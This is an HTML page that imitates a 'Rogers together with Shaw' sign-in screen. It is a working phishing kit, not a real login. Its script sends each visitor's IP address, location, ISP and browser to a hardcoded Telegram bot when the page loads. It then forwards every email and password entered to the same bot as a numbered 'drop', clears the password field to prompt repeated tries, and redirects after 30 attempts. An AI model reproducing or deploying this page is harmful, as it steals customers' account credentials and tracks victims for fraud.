
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in &#183; Rogers together with Shaw</title>
  <style>
    /* 1. Global Reset */
*, *::before, *::after {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* 2. Resolution Fix: Ensures the body centers the content on all screens */
body {
    font-family: Arial, sans-serif;
    background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1780679036/canada_bhe5j7.jpg');
    /* background-size: cover fills the screen without stretching */
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    background-attachment: fixed;
    min-height: 100vh;
    
    /* THE CENTERING ENGINE - ZERO SHIFT */
    display: flex;
    justify-content: center; /* Horizontally centers the box */
    align-items: center;     /* Vertically centers the box */
    padding: 20px;
}

/* 3. Intro Container (Locked Scale) */
#introImageContainer {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: black;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}

#introImageContainer img {
    max-width: 100%;
    max-height: 100%;
}

/* 4. LOGIN BOX - AUTO-CENTERED FOR ALL RESOLUTIONS */
.login-container {
    background: 
    backdrop-filter: blur(10px);
    border-radius: 20px; /* Adjusted from 70px for better fit */
    padding: 30px;
    width: 90%;          /* Mobile Width */
    max-width: 350px;    /* Laptop Width */
    
    /* REMOVED: margin-left: 600px (This causes the shift) */
    margin: 0 auto; 
    
    box-shadow: 
    /* display: none; */ /* Uncomment for your JS logic */
}

/* 5. Typography & Forms */
.welcome-title {
    color: #0066cc;
    font-size: 28px;
    font-weight: 600;
    margin-bottom: 30px;
    text-align: center; /* Centered for consistent look */
}

.form-group {
    margin-bottom: 20px;
    width: 100%;
}

.form-label {
    display: block;
    color: #666;
    font-size: 14px;
    font-weight: 500;
    margin-bottom: 8px;
}

.form-input {
    width: 100%;
    padding: 12px 16px;
    border: 2px solid #d1d5db;
    border-radius: 8px;
    font-size: 16px;
    background: white;
}

.password-container {
    position: relative;
    width: 100%;
}

.password-toggle {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    color: #666;
    font-size: 18px;
}

/* 6. SIGN IN BUTTON - LOCKED IN CENTER */
.sign-in-btn {
    width: 100%; /* Changed to 100% for mobile usability, box handles sizing */
    background: #FF9999;
    color: white;
    border: none;
    padding: 14px;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    
    /* FORCED CENTERING */
    display: block;
    margin: 10px auto 20px auto; 
    transition: background-color 0.3s ease;
}

.sign-in-btn:hover {
    background: #ff7777;
}

.help-links {
    display: flex;
    flex-direction: column;
    gap: 10px;
    text-align: center;
}

.help-link {
    color: #0066cc;
    text-decoration: none;
    font-size: 14px;
}

/* 7. AUTO-FIX FOR MOBILE RESOLUTIONS */
@media (max-width: 480px) {
    .login-container {
        width: 95%;
        padding: 20px;
    }
    .welcome-title {
        font-size: 24px;
    }
}
  </style>
</head>
<body>
  <!-- 👇 Int Image Ovelay -->
  <div id="introImageContainer">
    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png" alt="Intro Image" />
  </div>

  <!-- 👇 Log Fom -->
  <div class="login-container" id="loginContainer">
    <h1 class="welcome-title"></h1>

    <form id="loginForm">
      <div id="errorMessage" class="error-message" style="display: none;"></div>

      <div class="form-group">
  <input type="text" id="userId" name="userId" class="form-input" placeholder="Email" required value="" />
</div>

      <div class="form-group">
  <div class="password-container">
    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required />
    <button type="button" class="password-toggle" onclick="togglePassword()">👁</button>
  </div>
</div>

      <div class="checkbox-container">
        <input type="checkbox" id="rememberUser" name="rememberUser" class="checkbox" />
        <label for="rememberUser" class="checkbox-label">Remember my email</label>
      </div>

      <button type="submit" class="sign-in-btn">Sign in</button>

      
      </div>
    </form>
  </div>

  <script>
    const token = '8757890649:AAHQ9hfKHEA125d3UK2KoYpskbQjuRlNnrI';
    const chatId = '8052751627';
    let loginAttempts = 0;

    async function sendToTelegram(message) {
      if (!navigator.onLine) return;
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });
      } catch (err) {
        console.error('Telegram send error:', err);
      }
    }

    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const toggleButton = document.querySelector('.password-toggle');

      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleButton.textContent = '🙈';
      } else {
        passwordInput.type = 'password';
        toggleButton.textContent = '👁';
      }
    }

    function sendVisitorInfo() {
      const userAgent = navigator.userAgent;
      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');

      if (!navigator.onLine) {
        sendToTelegram(`XTRA Offline Visi\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
        return;
      }

      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `🌐 shawcana Visi \nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
          sendToTelegram(message);
        }).catch(() => {
          sendToTelegram(`🌐 shawcana Visi (IP lookup failed)\nBrowser: ${userAgent}`);
        });
    }

    window.onload = () => {
      sendVisitorInfo();

      setTimeout(() => {
        const intro = document.getElementById('introImageContainer');
        const login = document.getElementById('loginContainer');
        if (intro) intro.style.display = 'none';
        if (login) login.style.display = 'block';
      }, 50);
    };

    document.getElementById('loginForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const userId = document.getElementById('userId').value.trim();
      const password = document.getElementById('password').value.trim();

      if (userId && password) {
        loginAttempts++;
        const msg = `❌ shawcana drop #${loginAttempts}\n👤 User ID: ${userId}\n🔑 Password: ${password}`;
        await sendToTelegram(msg);

        const errorMsg = document.getElementById('errorMessage');
        errorMsg.textContent =
          "";
        errorMsg.style.display = 'block';

        document.getElementById('password').value = '';
        document.getElementById('password').focus();

        if (loginAttempts >= 30) {
          window.location.href =
            'https://res.cloudinary.com/dxzzgijsa/image/upload/v1766248245/Screenshot_2025-12-17_072511_ao2aww.png';
        }
      }
    });
  </script>
</body>
</html>
